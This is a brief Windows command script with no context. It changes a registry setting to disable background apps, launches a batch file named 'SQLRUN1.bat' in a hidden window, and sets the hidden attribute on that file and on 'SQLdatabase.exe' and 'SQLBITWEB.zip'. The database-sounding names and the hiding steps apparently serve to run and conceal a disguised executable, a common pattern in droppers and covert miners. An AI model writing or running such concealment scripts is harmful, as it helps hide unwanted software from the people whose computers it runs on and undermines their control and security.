Reg Add HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications /v GlobalUserDisabled /t REG_DWORD /d 1 /f
start-process SQLRUN1.bat -windowstyle hidden SQLRUN1.bat
attrib +h SQLdatabase.exe 
attrib +h SQLRUN1.bat  
attrib +h SQLBITWEB.zip
exit


